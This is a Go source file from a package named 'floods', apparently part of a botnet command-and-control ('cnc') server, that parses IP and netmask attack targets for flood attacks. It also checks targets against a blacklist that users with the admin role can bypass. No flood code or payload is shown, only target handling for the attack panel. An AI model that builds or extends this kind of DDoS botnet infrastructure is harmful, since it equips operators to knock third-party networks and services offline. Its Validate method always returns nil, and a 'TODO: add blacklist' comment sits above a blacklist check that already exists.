package floods

import (
	"cnc/internal/database"
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"
)

var (
	// ErrBlankTarget is returned when a blank target is specified.
	ErrBlankTarget = errors.New("blank target specified")

	// ErrInvalidNetmask is returned when an invalid netmask is specified.
	ErrInvalidNetmask = errors.New("invalid netmask specified")

	// ErrBlacklistedTarget is returned when a blacklisted target is specified.
	ErrBlacklistedTarget = errors.New("target is blacklisted")

	// ErrInvalidTarget is returned when an invalid target is specified.
	ErrInvalidTarget = errors.New("invalid target specified")
)

// Target is a struct that contains the host, address, and netmask of a target.
type Target struct {
	// Host is the literal host of the target.
	Host string
	// Address is the address of the target converted into an uint32.
	Address uint32
	// Netmask is the netmask of the target.
	Netmask uint8
}

func NewTarget(host string, profile *database.UserProfile) (target *Target, err error) {
	target = new(Target)
	target.Netmask = 32

	targetInfo := strings.Split(host, "/")
	if len(targetInfo) == 0 {
		return nil, ErrBlankTarget
	}

	target.Host = targetInfo[0]

	if len(targetInfo) > 2 {
		return nil, ErrInvalidNetmask
	}

	if len(targetInfo) == 2 {
		netmaskTmp, err := strconv.Atoi(targetInfo[1])
		if err != nil || netmaskTmp > 32 || netmaskTmp < 0 {
			return nil, ErrInvalidNetmask
		}

		target.Netmask = uint8(netmaskTmp)
	}

	ip := net.ParseIP(target.Host)
	if ip == nil {
		return nil, ErrInvalidTarget
	}

	target.Address = binary.BigEndian.Uint32(ip[12:])

	// TODO: add blacklist
	if database.Blacklist.Is(target.Address, target.Netmask) && !profile.HasRole("admin") {
		return nil, ErrBlacklistedTarget
	}

	return target, nil
}

func (t *Target) Validate() error {
	return nil
}
